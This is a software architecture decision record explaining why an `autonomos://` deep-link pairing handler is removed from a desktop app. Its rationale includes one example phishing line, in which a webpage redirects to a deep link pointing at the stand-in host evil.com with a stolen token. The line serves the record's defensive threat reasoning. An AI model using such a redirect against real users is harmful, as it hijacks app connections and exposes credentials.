## ADR-029-follow-up: Drop `autonomos://` deep-link handler
**Date:** 2026-05-27
**Decided by:** Terry + Feature Worker (CC session)
**Source:** Post-merge cleanup discussion after PR #173

**Context:** ADR-028 (and its post-design audit) called for an `autonomos://connect?url=...&token=...` URL scheme so `install.sh` could print a clickable link to pair the Desktop with a freshly-installed server. The handler shipped in PR #173 (Phase 1B.2) along with `setAsDefaultProtocolClient`, an `open-url` listener, a `pendingDeepLinks` argv buffer, and a "Pre-filled from a deep link" warning banner on `AddConnectionModal`. After ADR-029 collapsed the first-launch flow into Built-in mode (no `install.sh` needed for the default user), the deep-link path became a vestigial bridge: it only helps users who already chose to install a remote/Always-on server, who already have a terminal open with the URL+token printed in it.

**Decision:** Remove all `autonomos://` deep-link code and registration. The "Add a server" modal continues to accept paste-in URL + token; the `autonomos serve --print-url` CLI continues to print copyable pairing strings. Deep links are **deferred indefinitely** — not deprecated for one release, just removed. If user demand materializes (someone explicitly asks for "I want install.sh to launch the Desktop with a click"), revisit.

**Rationale:**
- **Phishing surface > utility.** A malicious webpage can fire `window.location = "autonomos://connect?url=evil.com&token=stolen"` and macOS routes the URL to autonomOS.app with no browser confirmation dialog. ADR-028's mitigation (explicit user click, no auto-submit, warning banner for non-loopback HTTP) reduces but does not eliminate the social-engineering risk that a user clicks "Connect" because the modal looks legitimate.
- **The intended-user flow is already <30 seconds without it.** Paste URL + token from `autonomos serve --print-url` into the Add Server modal is one copy + one paste. The "click the magical link" win is shaved off a flow that's already friction-free for the few users who hit it.
- **ADR-029 made the deep-link bridge less load-bearing.** The default user now boots straight into Built-in mode with no install step. The deep-link path was a bridge between "install.sh prints URL" and "Desktop pre-fills the modal" — neither end of that bridge is the dominant flow anymore.
- **Code removed > code kept.** ~80 LOC across `main.ts` (URL_SCHEME import, `pendingDeepLinks` buffer, `open-url` listener, `setAsDefaultProtocolClient`), `shared/constants.ts` (URL_SCHEME, `DEEP_LINK_RECEIVED` IPC), `AddConnectionModal.tsx` (`prefill` prop + warning JSX), and `electron-builder.yml` (`protocols:` registration). One less feature to maintain, one less attack surface in the Info.plist.

**Alternatives considered:**
- **Keep deep links, harden further.** Add a one-time confirmation toast "autonomOS Desktop received a pairing request from `<url>` — is this from your terminal?" before opening the modal. Rejected: adds a step to the flow it was meant to remove, and savvy attackers still social-engineer through it.
- **Remove the handler, keep the constant.** Leaves a half-deleted feature in the tree. Rejected — the constant existed only to be referenced by the handler.
- **Deprecate via flag for one release.** Standard rollout safety, but the feature has no users yet (deep links never made it into `install.sh` output before this drop). Pure code removal is safe.

**Implications:**
- ADR-028's "post-design audit corrections" bullet about deep links is no longer load-bearing. Not deleted — kept for historical context.
- `install.sh` (when it ships) will print URL + token as plain text for copy-paste, not as an `autonomos://` link.
- `Info.plist` no longer claims the `autonomos://` scheme — no chance of accidental routing if a stale Desktop install lingers on disk after this version.
- Phase 1B.2.4 (deep-link phase from the original Phase 1B.2 plan) is dropped from the roadmap. Phase numbering is not renumbered; the gap is intentional historical record.
- Also dropped the unused `SERVER_STATE_FILENAME = "server-state.json"` constant from `packages/app/src/shared/constants.ts`. ADR-028's post-design audit established that the daemon pid file at `~/.autonomos/autonomos.pid` (already shipping from `packages/server/src/pid-file.ts`) is the canonical discovery target; the `server-state.json` constant was vestigial from an earlier draft and had no importers.

**Single-instance lock is preserved.** ADR-028's audit emphasized that `app.requestSingleInstanceLock()` is a top-level requirement, not a deep-link feature — without it, two Desktop processes would torn-write `tokens.dat` / `config.json`. The lock + the `second-instance` handler (now reduced to "bring window forward / open Welcome") stay in `main.ts`.

**Update (2026-06-29, ADR-051):** Moot — the entire desktop app (and its `autonomos://` deep-link surface) is removed by ADR-051. Kept for historical record.
